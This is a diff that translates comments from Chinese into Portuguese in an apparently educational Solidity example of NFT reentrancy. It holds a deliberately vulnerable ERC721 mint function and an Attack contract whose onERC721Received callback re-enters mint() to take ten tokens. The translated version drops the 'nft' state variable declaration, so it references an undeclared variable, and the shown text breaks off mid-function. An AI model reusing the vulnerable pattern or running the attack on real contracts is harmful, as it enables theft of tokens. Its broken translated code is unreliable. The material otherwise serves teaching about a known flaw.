@@ -1,43 +1,43 @@
 // SPDX-License-Identifier: MIT
-// By 0xAA
+// Por 0xAA
 pragma solidity ^0.8.4;
 import "@openzeppelin/contracts/token/ERC721/ERC721.sol";
 
-// NFT contract with Reentrancy Vulnerability
+// Contrato NFT com Vulnerabilidade de Reentrância
 contract NFTReentrancy is ERC721 {
     uint256 public totalSupply;
     mapping(address => bool) public mintedAddress;
-    // 构造函数，初始化NFT合集的名称、代号
+    // Construtor, inicializa o nome e o código da coleção NFT
     constructor() ERC721("Reentry NFT", "ReNFT"){}
 
-    // 铸造函数，每个用户只能铸造1个NFT
-    // 有重入漏洞
+    // Função de criação, cada usuário só pode criar 1 NFT
+    // Há uma vulnerabilidade de reentrada
     function mint() payable external {
-        // 检查是否mint过
+        // Verificar se foi mintado antes
         require(mintedAddress[msg.sender] == false);
-        // 增加total supply
+        // Aumentar o fornecimento total
         totalSupply++;
         // mint
         _safeMint(msg.sender, totalSupply);
-        // 记录mint过的地址
+        // Registre os endereços que foram mintados
         mintedAddress[msg.sender] = true;
     }
 }
 
 contract Attack is IERC721Receiver{
-    NFTReentrancy public nft; // Bank合约地址
+    // Endereço do contrato Bank
 
-    // 初始化NFT合约地址
+    // Inicializando o endereço do contrato NFT
     constructor(NFTReentrancy _nftAddr) {
         nft = _nftAddr;
     }
     
-    // 攻击函数，发起攻击
+    // Função de ataque, iniciando o ataque
     function attack() external {
         nft.mint();
     }
 
-    // ERC721的回调函数，会重复调用mint函数，铸造10个
+    // Função de retorno do ERC721, que chama repetidamente a função mint para criar 10 tokens.
     function onERC721Received(address, address, uint256, bytes memory) public virtual override returns (bytes4) {
         if(nft.balanceOf(address(this)) < 10){
             nft.mint();
